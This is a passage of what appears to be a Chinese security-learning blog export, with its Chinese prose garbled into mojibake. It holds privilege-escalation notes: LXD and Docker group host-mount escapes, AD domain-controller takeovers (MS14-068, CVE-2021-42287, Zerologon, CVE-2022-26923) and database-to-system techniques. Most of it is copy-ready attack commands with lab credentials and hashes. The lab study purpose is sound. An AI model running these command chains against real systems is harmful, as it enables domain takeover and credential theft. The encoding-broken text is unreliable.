ææƒï¼‰</p><p>ä¸‹é¢ä¸¤ä¸ªä¾‹å­éƒ½æ˜¯è·å¾—äº†ç›®æ ‡æœºå™¨ä¸Šçš„dockerç”¨æˆ·ç»„ä¸‹çš„ç”¨æˆ·ï¼Œé€šè¿‡å®¹å™¨è®¿é—®åˆ°&#x2F;rootä¸‹çš„æ–‡ä»¶</p><h2 id="æ™®é€šç”¨æˆ·-LXDå®¹å™¨"><a href="#æ™®é€šç”¨æˆ·-LXDå®¹å™¨" class="headerlink" title="æ™®é€šç”¨æˆ·-LXDå®¹å™¨"></a>æ™®é€šç”¨æˆ·-LXDå®¹å™¨</h2><p>åŸç†ï¼š</p><p>LXDæ˜¯åŸºäºLXCå®¹å™¨çš„ç®¡ç†ç¨‹åºï¼Œå½“å‰ç”¨æˆ·å¯æ“ä½œå®¹å™¨ï¼Œ</p><p>ç†è§£ä¸ºç”¨æˆ·åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Œå†ç”¨å®¹å™¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ï¼Œ</p><p>æœ€åä½¿ç”¨å®¹å™¨æƒé™æ“ä½œå®¿ä¸»æœºç£ç›˜å†…å®¹è¾¾åˆ°ææƒæ•ˆæœã€‚</p><p>lxdæœ¬åœ°ææƒæ¡ä»¶:</p><p>idçœ‹ä¸€ä¸‹ç”¨æˆ·ç»„</p><p>-å·²ç»è·å¾—Shell</p><p>-ç”¨æˆ·å±äºlxdç»„</p><p><a href="https://www.vulnhub.com/entry/ai-web-2,357/">https://www.vulnhub.com/entry/ai-web-2,357/</a></p><p>1ã€å…¥å£ç‚¹ï¼š</p><p>User: n0nr00tuser</p><p>Pass: zxowieoi4sdsadpEClDws1sf</p><p>2ã€æ£€æµ‹åŠåˆ©ç”¨ï¼š</p><p>.&#x2F;LinEnum.sh</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><p>3ã€åˆ›å»ºå®¹å™¨ï¼ŒæŒ‚è½½ç£ç›˜ï¼Œè¿›å…¥å®¹å™¨ï¼Œè¿›å…¥ç›®å½•ææƒ</p><p>lxc image import .&#x2F;alpine-v3.13-x86_64-20210218_0139.tar.gz â€“alias test</p><p>lxc init test test -c security.privileged&#x3D;true</p><p>lxc config device add test test disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true&#x2F;&#x2F; æŠŠç›®æ ‡æœºå™¨çš„&#x2F;æ‹‰åˆ°é•œåƒé‡Œçš„&#x2F;mnt&#x2F;root</p><p>è®¿é—®è™šæ‹Ÿç¯å¢ƒä¸­çš„&#x2F;mnt&#x2F;rootå°±ç›¸å½“äºè®¿é—®ç›®æ ‡æœºå™¨çš„&#x2F;</p><p>lxc start test</p><p>lxc exec test &#x2F;bin&#x2F;sh</p><p>cd &#x2F;mnt&#x2F;root&#x2F;root</p><p>cat flag.txt</p><h2 id="æ™®é€šç”¨æˆ·-Dockerå®¹å™¨"><a href="#æ™®é€šç”¨æˆ·-Dockerå®¹å™¨" class="headerlink" title="æ™®é€šç”¨æˆ·-Dockerå®¹å™¨"></a>æ™®é€šç”¨æˆ·-Dockerå®¹å™¨</h2><p>æŠŠä¸€ä¸ªæ™®é€šè´¦å·testæ·»åŠ åˆ°dockerç»„ï¼Œ</p><p>ä½¿ç”¨newgrpå°†rootåˆå§‹ç»„åˆ‡æ¢ä¸ºdocker</p><p>usermod -G docker testæŠŠteståŠ å…¥åˆ°dockerç»„</p><p>newgrp docker&#x2F;&#x2F;ç”Ÿæ•ˆ</p><p>su test</p><p>docker run -v &#x2F;:&#x2F;mnt -it alpine&#x2F;&#x2F;å°†çœŸæœºçš„&#x2F;æ”¾åˆ°dockerçš„&#x2F;mntä¸Š ï¼Œalpineæ˜¯é•œåƒåå­—</p><p>ls &#x2F;mnt&#x2F;root</p><p>Dockeræœ¬åœ°ææƒæ¡ä»¶:</p><p>1ã€å·²ç»è·å¾—Shell</p><p>2ã€ç”¨æˆ·å±äºdockerç»„</p><p>å‚è€ƒï¼šäº‘ä¸Šå®‰å…¨ç¬”è®°çš„é€ƒé€¸</p><p><a href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p><p>1ã€å…¥å£ç‚¹ï¼š</p><p>User: anurodh</p><p>Pass: !d0ntKn0wmYp@ssw0rd</p><p>2ã€æ£€æµ‹åŠåˆ©ç”¨ï¼š</p><p>.&#x2F;LinEnum.sh</p><p>3ã€åˆ›å»ºå®¹å™¨ï¼ŒæŒ‚è½½ç£ç›˜ï¼Œè¿›å…¥å®¹å™¨ï¼Œè¿›å…¥ç›®å½•ææƒ</p><p>docker run -v &#x2F;:&#x2F;mnt -it alpine</p><p>cd &#x2F;mnt&#x2F;root</p><p>-åŸºæœ¬å°±æ˜¯è·å–&#x2F;etc&#x2F;shadow</p><p>-å†™åˆ°å®¿ä¸»æœºSSHå¯†é’¥</p><p>-å†™åˆ°å®¿ä¸»æœºè®¡åˆ’ä»»åŠ¡</p><p>-CVEåˆ©ç”¨åå¼¹</p><h1 id="åŸŸæ§"><a href="#åŸŸæ§" class="headerlink" title="åŸŸæ§"></a>åŸŸæ§</h1><p>#å®æˆ˜åœºæ™¯ï¼š</p><p>é€šè¿‡æŠ€æœ¯æ‰‹æ®µæ‹¿ä¸‹å†…ç½‘åŸŸç¯å¢ƒä¸‹æŸä¸€å°æœåŠ¡å™¨æƒé™æˆ–æŸä¸»æœºä¸Šçš„åŸŸç”¨æˆ·è´¦å·å¯†ç åï¼Œ</p><p>ä¸ADåŸŸæ§ç½‘ç»œé€šè®¯æ­£å¸¸çš„æƒ…å†µä¸‹ï¼Œå¯ç›´æ¥ä½¿ç”¨åŸŸæ§ææƒCVEæ¼æ´è¿›è¡ŒåŸŸæ§æƒé™æå‡ã€‚</p><p>192.168.3.21æ˜¯åŸŸæ§åœ°å€ OWA2010CN-GODåŸŸæ§ä¸»æœº</p><h2 id="WIN-ADåŸŸæ§ææƒ-CVE-2014-6324"><a href="#WIN-ADåŸŸæ§ææƒ-CVE-2014-6324" class="headerlink" title="WIN-ADåŸŸæ§ææƒ-CVE-2014-6324"></a>WIN-ADåŸŸæ§ææƒ-CVE-2014-6324</h2><p>å‰ææ¡ä»¶ï¼š</p><p>1ã€éœ€è¦åŸŸç”¨æˆ·è´¦å·å¯†ç </p><p>2ã€ä¸€å°ä¸»æœºçš„ç®¡ç†å‘˜æƒé™</p><p>whoami &#x2F;user&#x2F;&#x2F;è·å–å½“å‰åŸŸå†…ç”¨æˆ·SIDå€¼</p><p>net time &#x2F;domain&#x2F;&#x2F;æŸ¥çœ‹åŸŸå†…æ§åˆ¶åœ°å€</p><p>net config workstation</p><p>ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -p åŸŸæˆå‘˜å¯†ç  -s åŸŸæˆå‘˜sid -d åŸŸæ§åˆ¶å™¨åœ°å€</p><p>ms14-068.exe -u <a href="mailto:&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;">&#109;&#x61;&#x72;&#x79;&#x40;&#x67;&#111;&#100;&#x2e;&#x6f;&#x72;&#103;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org&#x2F;&#x2F;ä¼šä¿å­˜ç¥¨æ®ç­‰ä¸€äº›ä¿¡æ¯</p><p>&#x2F;&#x2F;ä¸‹é¢æ˜¯mimikazå·¥å…·</p><p>kerberos::list</p><p>kerberos::purge&#x2F;&#x2F;æ¸…é™¤ç¥¨æ®</p><p>kerberos::ptc â€œ<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;">&#x54;&#x47;&#x54;&#x5f;&#116;&#x65;&#115;&#116;&#x30;&#50;&#64;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#x61;&#98;&#x2e;&#x63;&#x63;&#97;&#99;&#x68;&#101;</a>â€œ&#x2F;&#x2F;å¯¼å…¥ç¥¨æ®</p><p>dir\OWA2010CN-God.god.org\C$</p><p>psexec \OWA2010CN-God.god.org cmd&#x2F;&#x2F;é“¾æ¥åŸŸæ§cmd</p><h2 id="WIN-ADåŸŸæ§ææƒ-CVE-2021-42287-å½±å“winæœåŠ¡å™¨å…¨ç³»åˆ—åˆ°22"><a href="#WIN-ADåŸŸæ§ææƒ-CVE-2021-42287-å½±å“winæœåŠ¡å™¨å…¨ç³»åˆ—åˆ°22" class="headerlink" title="WIN-ADåŸŸæ§ææƒ-CVE-2021-42287&#x2F;&#x2F;å½±å“winæœåŠ¡å™¨å…¨ç³»åˆ—åˆ°22"></a>WIN-ADåŸŸæ§ææƒ-CVE-2021-42287&#x2F;&#x2F;å½±å“winæœåŠ¡å™¨å…¨ç³»åˆ—åˆ°22</h2><p>åªéœ€è¦åŸŸç”¨æˆ·è´¦å·å¯†ç </p><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>python3 sam_the_admin.py åŸŸå&#x2F;â€˜æ™®é€šç”¨æˆ·:æ™®é€šç”¨æˆ·å¯†ç â€™ -dc-ip åŸŸæ§IP -shell</p><p>python3 sam_the_admin.py god&#x2F;â€˜webadmin:admin!@#45â€™ -dc-ip 192.168.3.21 -shell</p><p>è¯¥æ¼æ´åˆ©ç”¨å®Œä¼šä½¿åŸŸå†…é€šä¿¡ä¸æ­£å¸¸ï¼Œéœ€è¦é€€å‡ºåå†åŠ å…¥åŸŸå†…</p><h2 id="WIN-ADåŸŸæ§ææƒ-CVE-2020-1472"><a href="#WIN-ADåŸŸæ§ææƒ-CVE-2020-1472" class="headerlink" title="WIN-ADåŸŸæ§ææƒ-CVE-2020-1472"></a>WIN-ADåŸŸæ§ææƒ-CVE-2020-1472</h2><p>&#x2F;&#x2F;æ‰“å®Œéœ€è¦æ¢å¤ï¼Œå› ä¸ºåŸŸæ§è®¾ç½®ç©ºå¯†ç ä¼šå½±å“æ­£å¸¸åŸŸå†…é€šä¿¡ å†…ç½‘æ”»é˜²ä¼šå†™æ€ä¹ˆæ¢å¤</p><p>CVE-2020-1472æ˜¯ç»§MS17010ä¹‹åå¥½ç”¨çš„NetLogonç‰¹æƒåŸŸæ§ææƒæ¼æ´ï¼Œ</p><p>å½±å“Windows Server 2008R2è‡³Windows Server 2019çš„å¤šä¸ªç‰ˆæœ¬ç³»ç»Ÿï¼Œ</p><p>åªè¦æ”»å‡»è€…èƒ½è®¿é—®åˆ°ç›®æ ‡åŸŸæ§äº•ä¸”çŸ¥é“åŸŸæ§è®¡ç®—æœºåå³å¯åˆ©ç”¨è¯¥æ¼æ´.</p><p>è¯¥æ¼æ´ä¸è¦æ±‚å½“å‰è®¡ç®—æœºåœ¨åŸŸå†…,ä¹Ÿä¸è¦æ±‚å½“å‰è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸ºWindows.</p><p>è®¡ç®—æœºåï¼šnbtscan -v -h 192.168.3.21</p><p>æ¼æ´æ£€æµ‹ï¼špython3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</p><p>é‡ç½®ç©ºå¯†ç ï¼špython3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</p><p>è¿æ¥åå¯¼å‡ºï¼špython3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass&#x2F;&#x2F;å¯¼å‡ºæ‰€æœ‰hash</p><p>WMIè¿æ¥åå¼¹ï¼š</p><p>python3 wmiexec.py god&#x2F;<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;">&#97;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#46;&#50;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</p><h2 id="WIN-ADåŸŸæ§ææƒ-CVE-2022-26923"><a href="#WIN-ADåŸŸæ§ææƒ-CVE-2022-26923" class="headerlink" title="WIN-ADåŸŸæ§ææƒ-CVE-2022-26923"></a>WIN-ADåŸŸæ§ææƒ-CVE-2022-26923</h2><p>ä¸‰ä¸ªåˆ©ç”¨æ–‡ä»¶</p><p>åœ¨kali203ä¸­ä½¿ç”¨å¯èƒ½ä¼šå†²çªï¼Œç”¨kali2022ç‰ˆæœ¬å¯ä»¥è§£å†³</p><p>å‰ææ¡ä»¶ï¼š</p><p>1ã€ä¸€ä¸ªåŸŸå†…æ™®é€šè´¦å·</p><p>2ã€åŸŸå†…å­˜åœ¨è¯ä¹¦æœåŠ¡å™¨</p><p>Kaliæ·»åŠ è®¿é—®åŸŸå†…ä¿¡æ¯ &#x2F;etc&#x2F;hosts</p><p>192.168.3.111 xiaodi.local</p><p>192.168.3.111 xiaodi-DC-CA</p><p>192.168.3.111 DC.xiaodi.local</p><p>è·å–CAç»“æ„åå’Œè®¡ç®—æœºå</p><p>certutil -config - -ping</p><p>åŸŸå†…ä¿¡æ¯</p><p>192.168.3.111</p><p>test Pass123&#x2F;&#x2F;testç”¨æˆ·å±äºåŸŸå†…æ™®é€šç”¨æˆ·ç»„</p><p>xiaodi-DC-CA&#x2F;&#x2F;CAåç§°</p><p>DC.xiaodi.local&#x2F;&#x2F;è®¡ç®—æœºåç§°</p><p>æ”»å‡»æœºæ‰§è¡Œ&#x2F;ä¸‰ä¸ªåˆ©ç”¨ç›®å½•ï¼Œè®°å¾—åˆ‡æ¢</p><p>1ã€ç”³è¯·è¯ä¹¦ï¼šï¼ˆCertipyï¼‰</p><p>certipy req â€˜åŸŸ&#x2F;test:Pass123@åŸŸæ§åå­—â€™ -ca xiaodi-DC-CA -template User -debug</p><p>certipy req â€˜xiaodi.local&#x2F;test:<a href="mailto:&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#x50;&#x61;&#x73;&#x73;&#49;&#50;&#x33;&#64;&#x44;&#x43;&#46;&#x78;&#x69;&#97;&#x6f;&#100;&#x69;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a>â€˜ -ca xiaodi-DC-CA -template User -debug</p><p>è¿™æ­¥æ“ä½œä¼šä¿å­˜ä¸€ä¸ªtest.pfxæ–‡ä»¶</p><p>2ã€æ£€æµ‹è¯ä¹¦ï¼ˆCertipyï¼‰</p><p>certipy auth -pfx test.pfx</p><p>3ã€æ·»åŠ ç”¨æˆ·ï¼šï¼ˆbloodyADï¼‰</p><p>python3 bloodyAD.py -d xiaodi.local -u test -p â€˜Pass123â€™ â€“host 192.168.3.111 addComputer pwnmachine â€˜CVEPassword1234*â€™</p><p>4ã€è®¾ç½®å±æ€§ï¼šï¼ˆbloodyADï¼‰</p><p>python3 bloodyAD.py -d xiaodi.local -u test -p â€˜Pass123â€™ â€“host 192.168.3.111 setAttribute â€˜CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;localâ€™ dNSHostName â€˜[â€œDC.xiaodi.localâ€]â€™</p><p>5ã€ç”³è¯·è¯ä¹¦ï¼šï¼ˆCertipyï¼‰</p><p>certipy req â€˜xiaodi.local&#x2F;pwnmachine$:CVEPassword1234*@192.168.3.111â€™ -template Machine -dc-ip 192.168.3.111 -ca xiaodi-DC-CA -debug&#x2F;&#x2F;è¯¥æ­¥éª¤ä¸æˆåŠŸå°±æ¢ä¸ªCertipy-mainç›®å½•æ‰§è¡Œ</p><p>6ã€æ£€æµ‹è¯ä¹¦ï¼šï¼ˆCertipyï¼‰</p><p>certipy auth -pfx .&#x2F;dc.pfx -dc-ip 192.168.3.111</p><p>æœ€åä¼šç»™ä¸€ä¸ªhashå€¼</p><p>7ã€è·å–HASHï¼šï¼ˆimpacketï¼‰</p><p>python3 secretsdump.py â€˜xiaodi.local&#x2F;dc$@DC.xiaodi.localâ€™ -hashes :b6046c1026699b59301ff66341838df4</p><p>8ã€åˆ©ç”¨HASHï¼šï¼ˆimpacketï¼‰</p><p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;">&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#x31;&#49;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æƒé™æå‡ </tag>
            
            <tag> å†…ç½‘ </tag>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“ææƒ</title>
      <link href="/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/08/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h1><p>æ•°æ®åº“ææƒæµç¨‹ï¼š</p><p>1ã€å…ˆè·å–åˆ°æ•°æ®åº“ç”¨æˆ·å¯†ç &#x2F;&#x2F;ä¸€èˆ¬å°±æ˜¯æ‹¿shellç¿»é…ç½®æ–‡ä»¶</p><p>-ç½‘ç«™å­˜åœ¨SQLæ³¨å…¥æ¼æ´</p><p>-æ•°æ®åº“çš„å­˜å‚¨æ–‡ä»¶æˆ–å¤‡ä»½æ–‡ä»¶</p><p>-ç½‘ç«™åº”ç”¨æºç ä¸­çš„æ•°æ®åº“é…ç½®æ–‡ä»¶</p><p>-é‡‡ç”¨å·¥å…·æˆ–è„šæœ¬çˆ†ç ´(éœ€è§£å†³å¤–è”é—®é¢˜)</p><p>2ã€åˆ©ç”¨æ•°æ®åº“ææƒé¡¹ç›®è¿›è¡Œè¿æ¥</p><p>javaå¯åŠ¨</p><p>Databasetools</p><p>RequestTemplate</p><p>javaå¯åŠ¨</p><p><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></p><p><a href="https://github.com/Hel10-Web/Databasetools">https://github.com/Hel10-Web/Databasetools</a></p><p><a href="https://github.com/1n7erface/RequestTemplate">https://github.com/1n7erface/RequestTemplate</a></p><p>3ã€å¯åˆ©ç”¨å»ºç«‹ä»£ç†è§£å†³ä¸æ”¯æŒå¤–è”</p><p>-åˆ©ç”¨å·²çŸ¥Webæƒé™å»ºç«‹ä»£ç†ï¼ˆç­‰åŒäºæœ¬åœ°è¿æ¥ï¼‰</p><p>-åˆ©ç”¨å·²çŸ¥æƒé™æ‰§è¡ŒSQLå¼€å¯å¤–è”ï¼ˆè®©æ•°æ®åº“æ”¯æŒå¤–è”ï¼‰</p><p>&#x2F;&#x2F;mysql </p><p>GRANT ALL PRIVILEGES ON *.*TOâ€™å¸å·â€˜@â€™%â€™ IDENTIFIED BYâ€™å¯†ç â€™ WITH GRANT OPTION;</p><p>flush privileges;</p><p>&#x2F;&#x2F;</p><p>EXEC sp_configure â€˜show advanced optionsâ€™,1;</p><p>RECONFIGURE;</p><p>EXEC sp_configure â€˜Ad Hoc Distributed Queriesâ€™,1;</p><p>RECONFIGURE;</p><p>ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE&#x3D;EXCLUSIVE SCOPE&#x3D;SPFILE;</p><p>SHUTDOWN IMMEDIATE;</p><p>STARTUP;</p><p>4ã€å¯åˆ©ç”¨æ•°æ®åº“ææƒç±»å‹æ¡ä»¶åŠæŠ€æœ¯</p><h3 id="MYSQLï¼šPHP-MYSQL-ä»¥webå…¥å£ææƒ"><a href="#MYSQLï¼šPHP-MYSQL-ä»¥webå…¥å£ææƒ" class="headerlink" title="-MYSQLï¼šPHP+MYSQL ä»¥webå…¥å£ææƒ"></a>-MYSQLï¼šPHP+MYSQL ä»¥webå…¥å£ææƒ</h3><p>æ¡ä»¶ï¼šROOTå¯†ç ï¼ˆé«˜ç‰ˆæœ¬çš„-secure-file-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶ï¼‰&#x2F;&#x2F;secure-file-priv&#x3D;â€œd:â€è¿™ç§å°±åªèƒ½åœ¨dç›˜å†…è¿›è¡Œææƒ</p><p>æŠ€æœ¯ï¼šUDF MOF å¯åŠ¨é¡¹ åå¼¹Shell &#x2F;&#x2F;MOF2008ä¹‹åå°±æ²¡äº†</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96">https://www.sqlsec.com/2020/11/mysql.html#%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96</a></p><h3 id="MSSQLï¼š-NET-MSSQL-ä»¥webå…¥å£ææƒ-winç‰¹æœ‰"><a href="#MSSQLï¼š-NET-MSSQL-ä»¥webå…¥å£ææƒ-winç‰¹æœ‰" class="headerlink" title="-MSSQLï¼š.NET+MSSQL ä»¥webå…¥å£ææƒ &#x2F;&#x2F;winç‰¹æœ‰"></a>-MSSQLï¼š.NET+MSSQL ä»¥webå…¥å£ææƒ &#x2F;&#x2F;winç‰¹æœ‰</h3><p>æ¡ä»¶ï¼šsaå¯†ç </p><p>æŠ€æœ¯ï¼šxp_cmdshell sp_oacreate CLR æ²™ç›’</p><p><a href="https://www.cnblogs.com/bonelee/p/15864534.html">https://www.cnblogs.com/bonelee/p/15864534.html</a></p><p>xp_cmdshell</p><p>xp_cmdshell æ‰©å±•å­˜å‚¨è¿‡ç¨‹å°†å‘½ä»¤å­—ç¬¦ä¸²ä½œä¸ºæ“ä½œç³»ç»Ÿå‘½ä»¤ shell æ‰§è¡Œï¼Œå¹¶ä»¥æ–‡æœ¬è¡Œçš„å½¢å¼è¿”å›æ‰€æœ‰è¾“å‡ºã€‚</p><p><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);">SQL Server 2005ä¸­çš„xp_cmdshell<br></font><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);">        ç”±äºå­˜åœ¨å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥åœ¨SQL Server 2005ä¸­ï¼Œ xp_cmdshell é»˜è®¤æ˜¯å…³é—­çš„ã€‚<br></font>        æ­¤æ—¶ï¼Œå¦‚æœæ‰§è¡Œ xp_cmdshell å°†ä¼šæç¤ºæœåŠ¡æœªå¼€å¯ï¼š</p><ol><li>getshellæˆ–è€…å­˜åœ¨sqlæ³¨å…¥å¹¶ä¸”èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ã€‚</li><li>sql serveræ˜¯systemæƒé™ï¼Œsql serveré»˜è®¤å°±æ˜¯systemæƒé™ã€‚</li></ol><p>sp_oacreate </p><h3 id="Oracleï¼šï¼ˆç«™åº“åˆ†ç¦»ï¼ŒéJSPï¼Œç›´æ¥æ•°æ®åº“åˆ°ç³»ç»Ÿç­‰ï¼‰"><a href="#Oracleï¼šï¼ˆç«™åº“åˆ†ç¦»ï¼ŒéJSPï¼Œç›´æ¥æ•°æ®åº“åˆ°ç³»ç»Ÿç­‰ï¼‰" class="headerlink" title="-Oracleï¼šï¼ˆç«™åº“åˆ†ç¦»ï¼ŒéJSPï¼Œç›´æ¥æ•°æ®åº“åˆ°ç³»ç»Ÿç­‰ï¼‰"></a>-Oracleï¼šï¼ˆç«™åº“åˆ†ç¦»ï¼ŒéJSPï¼Œç›´æ¥æ•°æ®åº“åˆ°ç³»ç»Ÿç­‰ï¼‰</h3><p>ä¸€èˆ¬oracleå’Œjspã€javaç»“åˆçš„å¤šï¼Œæ‹¿åˆ°å°±æ˜¯é«˜æƒé™ï¼Œå†ä»oracleä»ä½æƒé™åˆ°é«˜æƒé™å¤ªé¸¡è‚‹</p><p>æ¡ä»¶ï¼šæ•°æ®åº“ç”¨æˆ·å¯†ç </p><p>æŠ€æœ¯ï¼šDBAï¼Œæ™®é€šç”¨æˆ·ï¼Œæ³¨å…¥æ¨¡å¼</p><h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="-PostgreSQL"></a>-PostgreSQL</h3><p>Webåˆ°ç³»ç»Ÿ</p><p>æ¡ä»¶ï¼šæ•°æ®åº“ç”¨æˆ·å¯†ç </p><p>æŠ€æœ¯ï¼šCVE-2019-9193 UDF libc&#x2F;&#x2F;ç°é˜¶æ®µæ˜¯15ã€16ç‰ˆæœ¬ï¼Œlibcåˆ©ç”¨æ˜¯8.2ç‰ˆæœ¬ä¹‹å‰æ¯”è¾ƒè€</p><p>å¤ç°é•œåƒï¼š</p><p><a href="https://market.aliyun.com/products/56024006/cmjj016247.html">https://market.aliyun.com/products/56024006/cmjj016247.html</a></p><p>DROPTABLEIF EXISTS cmd_exec;</p><p>CREATE TABLEcmd_exec(cmd_output text);</p><p>COPY cmd_exec FROM PROGRAM â€˜idâ€™;</p><p>SELECT* FROM cmd_exec;</p><h3 id="Redis-linuxç‰¹æœ‰-winä¹Ÿèƒ½è£…"><a href="#Redis-linuxç‰¹æœ‰-winä¹Ÿèƒ½è£…" class="headerlink" title="-Redis  &#x2F;&#x2F;linuxç‰¹æœ‰ winä¹Ÿèƒ½è£…"></a>-Redis  &#x2F;&#x2F;linuxç‰¹æœ‰ winä¹Ÿèƒ½è£…</h3><p>ç«¯å£ï¼š6379</p><p>æ•°æ®åº“åˆ°Linux</p><p>æ¡ä»¶ï¼šåˆ©ç”¨æœªæˆæƒæˆ–å¯†ç è¿æ¥åæ‰§è¡Œ</p><p>è§ç¬¬78å¤©è¯¾ç¨‹å†…å®¹-åªé€‚ç”¨Linux</p><p>æŠ€æœ¯ï¼šå†™å¯†é’¥ssh è®¡åˆ’ä»»åŠ¡ åå¼¹shell CVE2022æ²™ç›’æ‰§è¡Œ</p><p>ä½¿ç”¨MUDTçš„æ—¶å€™è®¡åˆ’ä»»åŠ¡å¸¸ç”¨ã€å¯†é’¥sshå’Œåå¼¹shellä¼šå‡ºç°é—®é¢˜</p><p>è®¡åˆ’ä»»åŠ¡&#x2F;var&#x2F;spool&#x2F;cronä¸‹</p><p>å¤ç°æ­å»ºï¼š</p><p>wget <a href="http://download.redis.io/releases/redis-2.8.17.tar.gz">http://download.redis.io/releases/redis-2.8.17.tar.gz</a></p><p>tar xzf redis-2.8.17.tar.gz</p><p>cd redis-2.8.17</p><p>make</p><p>cd src</p><p>&#x2F;redis-server</p><h3 id="Memcached"><a href="#Memcached" class="headerlink" title="-Memcached"></a>-Memcached</h3><p>ç«¯å£ï¼š11211</p><p>æ•°æ®åº“åˆ°Linux</p><p>æ¡ä»¶ï¼šè®¾ç½®è¿œç¨‹å¯è®¿é—®æˆ–å–å¾—æœ¬åœ°æƒé™åè®¿é—®</p><p>æ˜¯ä¸€å¥—å¸¸ç”¨çš„key-valueç¼“å­˜ç³»ç»Ÿï¼Œç”±äºå®ƒæœ¬èº«æ²¡æœ‰æƒé™æ§åˆ¶æ¨¡å—ï¼Œ</p><p>æœåŠ¡è¢«æ”»å‡»è€…æ‰«æå‘ç°ï¼Œé€šè¿‡å‘½ä»¤äº¤äº’å¯ç›´æ¥è¯»å–memcacheä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><p>å¤ç°é•œåƒï¼š</p><p><a href="https://market.aliyun.com/products/56024006/cmjj017529.html">https://market.aliyun.com/products/56024006/cmjj017529.html</a></p><p>æ¡ˆä¾‹å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg">https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg</a></p><p>å¼€å¯å‘½ä»¤ï¼š</p><p>systemctl start memcached.service</p><p>å…³é—­å‘½ä»¤ï¼š</p><p>systemctl stop memcached.service</p><p>æŸ¥çœ‹çŠ¶æ€ï¼š</p><p>systemctl status memcached.service</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> æƒé™æå‡ </tag>
            
            <tag> å†…ç½‘ </tag>
            
            <tag> æ•°æ®åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤šå±‚ä»£ç†æ­å»º</title>
      <link href="/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/"/>
      <url>/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/</url>
      
